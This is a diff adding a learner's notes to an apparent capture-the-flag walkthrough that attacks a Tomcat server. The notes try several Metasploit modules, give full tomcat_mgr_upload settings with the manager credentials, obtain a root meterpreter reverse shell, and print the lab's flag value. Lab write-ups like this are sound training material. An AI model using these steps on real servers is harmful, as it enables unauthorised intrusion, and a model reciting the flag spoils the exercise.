@@ -37,5 +37,30 @@ This info was in the nikto output - 1.1
 
 ### Use Metasploit to exploit the service and get a shell on the system. WHat user did you get a shell as?
 moving over to msf room
+loaded metasploit, used search tomcat to try some exploits - this gives us 21 options.
+filtering to try the excellent ranks first, leaves us with 10 options.
+exploit/linux/http/cisco_prime_inf_rce - able to upload and execute payload but no session created
+exploit/linux/http/cpi_tararchive_upload unable to use - does specify cisco prime infrastructure - maybe this is the issue
+skipping ones mentioning cisco - now seeing not all actually even mention tomcat. excellent tomcat exploits count is actually 4
+exploit/multi/http/tomcat_jsp_upload_bypass - failed to upload payload
+exploit/multi/http/tomcat_mgr_deploy - no luck
+multi/http/tomcat_mgr_upload - we're in:
+	set LHOST (local ip)
+	set LPORT 4444
+	set RHOSTS (machine ip)
+	set RPORT 1234
+	set SSL false
+	set TARGETURI /manager
+	
+	set HttpUsername bob
+	set HttpPassword bubbles
+	run
+gives us a meterpreter session. shell gives us a shell
+whoami tells us we're root
+
+trying last excellent exploit just in case!!
+exploit/windows/http/tomcat_cgi_cmdlineargs - target not vulnerable
 
 ### What text is in the file /root/flag.txt
+cat /root/flag.txt
+ff1fc4a81affcc7688cf89ae7dc6e0e1
